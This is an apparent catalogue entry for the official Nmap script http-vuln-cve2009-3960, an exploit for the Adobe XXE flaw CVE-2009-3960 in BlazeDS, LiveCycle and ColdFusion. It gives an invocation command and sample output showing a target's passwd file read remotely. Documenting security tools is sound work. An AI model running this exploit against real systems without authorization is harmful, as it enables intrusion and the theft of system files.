---
title: "http-vuln-cve2009-3960"
source: official
category: "Exploit"
categories:
  - "exploit"
  - "intrusive"
  - "vuln"
shortDescription: "Exploits cve-2009-3960 also known as Adobe XML External Entity Injection."
risk: intrusive
tags:
  - "exploit"
  - "intrusive"
  - "vuln"
  - "portrule"
scriptTypes:
  - "portrule"
protocols: []
ports: []
usage: "nmap --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root=\"/root/\" <target>"
outputPreview:
  - "PORT   STATE SERVICE"
  - "80/tcp open  http"
  - "| http-vuln-cve2009-3960:"
  - "|     samples/messagebroker/http"
  - "|     <?xml version=\"1.0\" encoding=\"utf-8\"?>"
  - "|     <amfx ver=\"3\"><body targetURI=\"/onResult\" responseURI=\"\"><object type=\"flex.messaging.messages.AcknowledgeMessage\"><traits><string>timestamp</string><string>headers</string><string>body</string><string>correlationId</string><string>messageId</string><string>timeToLive</string><string>clientId</string><string>destination</string></traits><double>1.325337665684E12</double><object><traits><string>DSMessagingVersion</string><string>DSId</string></traits><double>1.0</double><string>5E037B49-540B-EDCF-A83A-BE9059CF6812</string></object><null/><string>root:x:0:0:root:/root:/bin/bash"
author: "Nmap Project"
reference:
  label: "View Official Script Source"
  url: "https://svn.nmap.org/nmap/scripts/http-vuln-cve2009-3960.nse"
documentationUrl: "https://nmap.org/nsedoc/scripts/http-vuln-cve2009-3960.html"
---

Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.
This vulnerability permits to read local files remotely and is present in
BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0, LiveCycle Data
Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and
ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0
